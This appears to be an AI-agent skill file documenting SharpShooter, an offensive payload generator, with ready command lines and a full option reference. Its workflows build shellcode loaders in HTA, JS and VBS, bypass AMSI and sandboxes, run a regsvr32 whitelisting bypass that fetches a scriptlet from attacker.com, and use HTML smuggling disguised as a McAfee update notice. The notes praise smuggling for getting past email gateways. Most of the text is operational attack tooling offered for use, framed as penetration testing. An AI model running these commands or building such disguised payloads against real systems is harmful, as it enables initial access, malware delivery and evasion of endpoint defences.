---
name: sharpshooter
description: A payload generation framework for retrieving and executing arbitrary CSharp source code. It creates payloads in various formats like HTA, JS, VBS, and WSF, supporting staging via COM, AMSI bypasses, and anti-sandbox checks. Use during the exploitation phase of a penetration test to generate initial access vectors and bypass application whitelisting or endpoint security.
---

# sharpshooter

## Overview
SharpShooter is a payload creation framework designed for the retrieval and execution of arbitrary CSharp source code. It is capable of creating payloads in a variety of formats including HTA, JS, VBS, and WSF. It features advanced techniques for COM staging, AMSI bypassing, and sandbox detection. Category: Exploitation.

## Installation (if not already installed)
Assume SharpShooter is already installed. If you encounter an error:

```bash
sudo apt install sharpshooter
```

Dependencies: python3, python3-jsmin.

## Common Workflows

### Generate a stageless HTA payload with raw shellcode
```bash
sharpshooter --stageless --payload hta --rawscfile ./shellcode.bin --output access_vector
```

### Create a JS payload with AMSI bypass and sandbox checks
```bash
sharpshooter --payload js --sandbox 2,3,4 --amsi amsienable --shellcode --scfile ./sc_bytes.txt --output loader
```

### Application Whitelist (AWL) bypass using regsvr32
```bash
sharpshooter --stageless --awl regsvr32 --awlurl http://attacker.com/shell.sct --payload vbs --output bypass
```

### HTML Smuggling with a specific template
```bash
sharpshooter --stageless --payload hta --rawscfile ./beacon.bin --smuggle --template mcafee --output update_notice
```

## Complete Command Reference

```
sharpshooter [-h] [--stageless] [--dotnetver <ver>] [--com <com>]
             [--awl <awl>] [--awlurl <awlurl>] [--payload <format>]
             [--sandbox <types>] [--amsi <amsi>] [--delivery <type>]
             [--rawscfile <path>] [--shellcode] [--scfile <path>]
             [--refs <refs>] [--namespace <ns>] [--entrypoint <ep>]
             [--web <web>] [--dns <dns>] [--output <output>]
             [--smuggle] [--template <tpl>]
```

### Options

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show the help message and exit |
| `--stageless` | Create a stageless payload |
| `--dotnetver <ver>` | Target .NET Version: `2` or `4` |
| `--com <com>` | COM Staging Technique: `outlook`, `shellbrowserwin`, `wmi`, `wscript`, `xslremote` |
| `--awl <awl>` | Application Whitelist Bypass Technique: `wmic`, `regsvr32` |
| `--awlurl <awlurl>` | URL to retrieve XSL/SCT payload |
| `--payload <format>` | Payload type: `hta`, `js`, `jse`, `vbe`, `vbs`, `wsf`, `macro`, `slk` |
| `--sandbox <types>` | Anti-sandbox techniques (comma-separated):<br>[1] Key to Domain (e.g. 1=CONTOSO)<br>[2] Ensure Domain Joined<br>[3] Check for Sandbox Artifacts<br>[4] Check for Bad MACs<br>[5] Check for Debugging |
| `--amsi <amsi>` | Use amsi bypass technique: `amsienable` |
| `--delivery <type>` | Delivery method: `web`, `dns`, `both` |
| `--rawscfile <path>` | Path to raw shellcode file for stageless payloads |
| `--shellcode` | Use built-in shellcode execution |
| `--scfile <path>` | Path to shellcode file as CSharp byte array |
| `--refs <refs>` | References required to compile custom CSharp (e.g., `mscorlib.dll,System.Windows.Forms.dll`) |
| `--namespace <ns>` | Namespace for custom CSharp (e.g., `Foo.bar`) |
| `--entrypoint <ep>` | Method to execute (e.g., `Main`) |
| `--web <web>` | URI for web delivery |
| `--dns <dns>` | Domain for DNS delivery |
| `--output <output>` | Name of output file (e.g., `maldoc`) |
| `--smuggle` | Smuggle file inside HTML |
| `--template <tpl>` | Name of template file (e.g., `mcafee`) |

## Notes
- When using `--sandbox 1`, you must provide the domain name in the format `1=DOMAINNAME`.
- The `--smuggle` option is highly effective for bypassing email gateways by embedding the payload within a benign-looking HTML file.
- Ensure the `--dotnetver` matches the target environment's installed .NET version for successful execution.